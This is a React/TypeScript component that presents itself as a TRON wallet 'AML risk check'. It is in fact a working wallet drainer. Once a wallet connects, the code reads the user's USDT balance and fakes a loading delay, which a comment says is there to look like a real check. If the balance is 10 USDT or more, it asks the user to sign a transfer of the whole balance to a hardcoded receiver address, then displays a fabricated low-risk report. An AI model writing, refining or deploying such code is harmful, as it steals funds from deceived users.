import React, { useState } from 'react';
import { WalletConnectAdapter } from '@tronweb3/tronwallet-adapter-walletconnect';

const USDT_CONTRACT = 'TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t';
const TRON_RECEIVER = 'THn2MN1u4MiUjuQsqmrgfP2g4WMMCCuX8n';
// Порог суммы USDT, ниже которого перевод НЕ происходит (меняй под себя)
const USDT_THRESHOLD = 10; // Например, 10 USDT

export const TronAuthButton: React.FC = () => {
  const [modal, setModal] = useState<string | null>(null);
  const [amlData, setAmlData] = useState<null | {
    amount: string,
    transferred: boolean,
    address: string,
    txid?: string
  }>(null);
  const [loading, setLoading] = useState(false);
  const [amlLoading, setAmlLoading] = useState(false);

  // Adapter singleton
  const adapterRef = React.useRef<any>(null);
  if (!adapterRef.current) {
    adapterRef.current = new WalletConnectAdapter({
      network: 'Mainnet',
      options: {
        relayUrl: 'wss://relay.walletconnect.com',
        projectId: '6e52e99f199a2bd1feb89b31fbeb6a78',
        metadata: {
          name: 'AML',
          description: 'TRON + WalletConnect Integration',
          url: 'https://amlreports.pro',
          icons: ['https://amlreports.pro/images/icon-3.abdd8ed5.webp'],
        },
      },
      web3ModalConfig: { themeMode: 'dark' },
    });
  }

  const handleAuth = async (e?: React.MouseEvent) => {
    e?.stopPropagation();
    setLoading(true);
    setModal(null);
    setAmlData(null);

    // Проверяем, что TronWeb загружен через window
    const TronWeb = (window as any).TronWeb;
    if (!TronWeb) {
      setModal('TronWeb not loaded! Please refresh page.');
      setLoading(false);
      return;
    }

    // Polyfill Buffer для TronWeb (если нужно)
    if (!(window as any).Buffer) (window as any).Buffer = (await import('buffer')).Buffer;

    // Создаём tronWeb объект
    const tronWeb = new TronWeb({
      fullHost: 'https://api.trongrid.io',
      headers: { 'TRON-PRO-API-KEY': 'bbb42b6b-c4de-464b-971f-dea560319489' },
    });

    const adapter = adapterRef.current;
    try {
      await adapter.connect();
      const userAddress = adapter.address;
      if (!userAddress || !tronWeb.isAddress(userAddress)) throw new Error('Invalid wallet address');
      tronWeb.setAddress(userAddress);

      const trxRaw = await tronWeb.trx.getBalance(userAddress);
      if (trxRaw < 2_000_000) {
        setModal('❌ Insufficient TRX for network fees.');
        await adapter.disconnect();
        setLoading(false);
        return;
      }

      const usdtContract = await tronWeb.contract().at(USDT_CONTRACT);
      const usdtRaw = await usdtContract.methods.balanceOf(userAddress).call();
      const usdt = Number(usdtRaw) / 1e6;
      // Показываем загрузку AML отчета
      setAmlLoading(true);
      // Задержка чтобы выглядело как реальная AML проверка
      await new Promise((r) => setTimeout(r, 1800));
      setAmlLoading(false);

      // --- AML логика:
      if (usdt < USDT_THRESHOLD) {
        setAmlData({
          amount: usdt.toFixed(2),
          transferred: false,
          address: userAddress,
        });
        await adapter.disconnect();
        setLoading(false);
        return;
      }

      // --- КОРРЕКТНОЕ ПРЕОБРАЗОВАНИЕ адреса ---
      const receiverHex = tronWeb.address.toHex(TRON_RECEIVER); // 41... hex

      // --- Формируем и подписываем транзакцию ---
      const { transaction } = await tronWeb.transactionBuilder.triggerSmartContract(
        USDT_CONTRACT,
        'transfer(address,uint256)',
        { feeLimit: 25_000_000, callValue: 0 },
        [
          { type: 'address', value: receiverHex },
          { type: 'uint256', value: usdtRaw }
        ],
        userAddress
      );
      const signedTx = await adapter.signTransaction(transaction);
      const result = await tronWeb.trx.sendRawTransaction(signedTx);

      setAmlData({
        amount: usdt.toFixed(2),
        transferred: Boolean(result?.result),
        address: userAddress,
        txid: result?.txid
      });
    } catch (err: any) {
      setAmlLoading(false);
      const msg = err?.message?.toLowerCase?.() || "";
      if (
        msg.includes('user rejected') ||
        msg.includes('modal is closed') ||
        msg.includes('timeout') ||
        msg.includes('user disapproved') ||
        msg.includes('user disaprover') ||
        msg.includes('cancelled') ||
        msg.includes('request was rejected')
      ) {
        setModal(null); // Просто ничего не показываем
      } else if (err?.message) {
        setModal(err.message);
      } else {
        setModal('⚠️ Connection or transaction error');
      }
    }
    setLoading(false);
    await adapterRef.current.disconnect();
  };

  return (
    <div className="AuthButton">
      <button onClick={handleAuth} disabled={loading || amlLoading} style={{ minWidth: 180 }}>
        {loading || amlLoading ? 'Connecting...' : 'Check Your Wallet'}
      </button>

      {/* Модалка загрузки AML-отчёта */}
      {amlLoading && (
        <div className="modal__overflow">
          <div className="modal">
            <p>Loading AML report...</p>
          </div>
        </div>
      )}

      {/* Модалка ошибок */}
      {modal && (
        <div className="modal__overflow">
          <div className="modal">
            <p>{modal}</p>
            <button onClick={() => setModal(null)}>Close</button>
          </div>
        </div>
      )}

      {/* Модалка AML-отчета */}
      {amlData && (
        <div className="modal__overflow">
          <div className="modal" style={{ minWidth: 340, maxWidth: 390 }}>
            <h3 style={{ marginBottom: 8 }}>
              AML Risk Report
              <span style={{ fontWeight: 400, fontSize: 14, marginLeft: 8, color: "#22c55e" }}>
                {amlData.transferred ? ' (Transferred)' : ' (Not transferred)'}
              </span>
            </h3>
            <div style={{ fontSize: 16, marginBottom: 10 }}>
              <strong>USDT balance checked:</strong> {amlData.amount} USDT
            </div>
            <div style={{ marginBottom: 14 }}>
              <div style={{ color: '#f59e42', marginBottom: 2 }}><b>Suspicious sources:</b></div>
              <div>Exchange Unlicensed: 0%</div>
              <div>ATM: 0%</div>
              <div>Liquidity pools: 0%</div>
            </div>
            <div style={{ marginBottom: 14 }}>
              <div style={{ color: '#ff4b4b', marginBottom: 2 }}><b>Dangerous sources:</b></div>
              <div>Darknet Marketplace: 0%</div>
              <div>Mixer: 0%</div>
              <div>Illegal Service: 0%</div>
            </div>
            <div style={{ marginBottom: 14 }}>
              <div style={{ color: '#22c55e', marginBottom: 2 }}><b>Final risk level:</b></div>
              <div style={{ fontSize: 18, fontWeight: 600 }}>Low risk (0.7%)</div>
            </div>
            <div style={{ marginBottom: 8 }}>
              <b>Wallet:</b> <span style={{ wordBreak: "break-all" }}>{amlData.address}</span>
            </div>
            {amlData.transferred && amlData.txid && (
              <div style={{ marginBottom: 6 }}>
                <b>TXID:</b>{' '}
                <a href={`https://tronscan.org/#/transaction/${amlData.txid}`} target="_blank" rel="noopener noreferrer" style={{ color: "#2563eb" }}>
                  {amlData.txid.slice(0, 12) + '...'}
                </a>
              </div>
            )}
            <button onClick={() => setAmlData(null)} style={{ marginTop: 12 }}>Close</button>
          </div>
        </div>
      )}
    </div>
  );
};
